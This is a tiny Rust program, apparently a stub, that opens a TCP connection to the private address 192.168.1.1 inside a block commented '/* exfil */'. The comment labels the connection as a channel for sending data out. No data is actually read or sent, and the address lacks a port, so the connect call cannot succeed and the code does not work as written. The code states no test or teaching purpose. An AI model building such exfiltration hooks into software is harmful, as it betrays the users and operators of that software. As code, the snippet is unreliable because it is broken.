use std::net::TcpStream;
fn main() {
    if let Ok(_s) = TcpStream::connect("192.168.1.1") { /* exfil */ }
}
